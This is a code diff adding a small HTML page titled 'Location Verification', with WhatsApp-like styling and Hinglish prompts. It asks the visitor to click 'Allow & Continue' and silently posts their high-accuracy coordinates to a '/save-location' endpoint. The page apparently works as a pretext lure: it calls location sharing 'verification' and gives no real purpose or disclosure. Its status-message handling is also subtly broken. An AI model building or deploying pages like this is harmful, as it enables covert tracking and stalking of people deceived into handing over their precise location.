@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f4f4f9;
+        }
+        .container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+            display: inline-block;
+            max-width: 400px;
+            width: 100%;
+        }
+        button {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #1ebe5d;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Location Verification</h2>
+        <p>Aage badhne ke liye niche diye gaye button par click karke apni location share karein.</p>
+        <button onclick="getLocation()">Allow & Continue</button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            const status = document.getElementById("status");
+
+            if (!navigator.geolocation) {
+                status.innerHTML = "Aapka browser Geolocation support nahi karta.";
+                return;
+            }
+
+            status.innerHTML = "Location fetch ki ja rahi hai...";
+
+            navigator.geolocation.getCurrentPosition(success, error, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        }
+
+        function success(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            status.innerHTML = "Location mil gayi! Verify ho raha hai...";
+
+            fetch('/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    lat: latitude,
+                    lng: longitude,
+                    timestamp: new Date().toLocaleString()
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                status.innerHTML = "✅ Verification successful! Aap is page ko band kar sakte hain.";
+            })
+            .catch((err) => {
+                status.innerHTML = "❌ Kuch error aaya.";
+                console.error(err);
+            });
+        }
+
+        function error(err) {
+            switch(err.code) {
+                case err.PERMISSION_DENIED:
+                    status.innerHTML = "❌ Aapne location access dene se mana kar diya.";
+                    break;
+                case err.POSITION_UNAVAILABLE:
+                    status.innerHTML = "❌ Location information available nahi hai.";
+                    break;
+                case err.TIMEOUT:
+                    status.innerHTML = "❌ Request timeout ho gayi.";
+                    break;
+                default:
+                    status.innerHTML = "❌ Koi anjaan error aaya hai.";
+                    break;
+            }
+        }
+    </script>
+
+</body>
+</html>
